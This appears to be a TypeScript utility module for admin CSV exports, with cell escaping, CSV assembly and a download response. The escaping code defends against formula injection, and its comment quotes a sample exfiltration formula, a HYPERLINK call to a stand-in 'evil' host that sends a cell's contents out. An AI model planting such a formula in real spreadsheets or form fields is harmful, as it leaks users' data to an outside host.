// Small, dependency-free CSV helpers for admin exports.
//
// RFC-4180-ish: fields containing a comma, quote, or newline are wrapped in
// double quotes and inner quotes are doubled. A UTF-8 BOM is prepended so
// Excel opens accented characters correctly.

export interface CsvColumn<T> {
  header: string;
  value: (row: T) => string | number | boolean | null | undefined;
}

/**
 * Escape one CSV cell.
 *
 * Also defuses CSV/formula injection: Excel, LibreOffice and Google Sheets
 * evaluate any cell whose text begins with `=`, `+`, `-`, `@` (or a leading
 * tab/CR) as a formula — so an attendee who types `=HYPERLINK("http://evil/?"&A1)`
 * into a name or a custom form answer gets that formula executed on the
 * organizer's machine when they open the export. Prefixing a single quote makes
 * the spreadsheet treat it as literal text; the visible value is unchanged.
 * Exported so client-side exports share exactly one implementation.
 */
export function escapeCsvCell(v: string | number | boolean | null | undefined): string {
  let s = v === null || v === undefined ? '' : String(v);
  if (/^[=+\-@\t\r]/.test(s)) s = `'${s}`;
  return /[",\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}

const escapeCell = escapeCsvCell;

export function toCsv<T>(rows: T[], columns: CsvColumn<T>[]): string {
  const head = columns.map(c => escapeCell(c.header)).join(',');
  const body = rows
    .map(r => columns.map(c => escapeCell(c.value(r))).join(','))
    .join('\r\n');
  return body ? `${head}\r\n${body}\r\n` : `${head}\r\n`;
}

/** Build a downloadable CSV Response with a filename + Excel-friendly BOM. */
export function csvResponse(csv: string, filename: string): Response {
  return new Response('﻿' + csv, {
    headers: {
      'Content-Type': 'text/csv; charset=utf-8',
      'Content-Disposition': `attachment; filename="${filename}"`,
      'Cache-Control': 'no-store',
    },
  });
}

/** yyyy-mm-dd for filenames. */
export function csvDateStamp(): string {
  return new Date().toISOString().slice(0, 10);
}
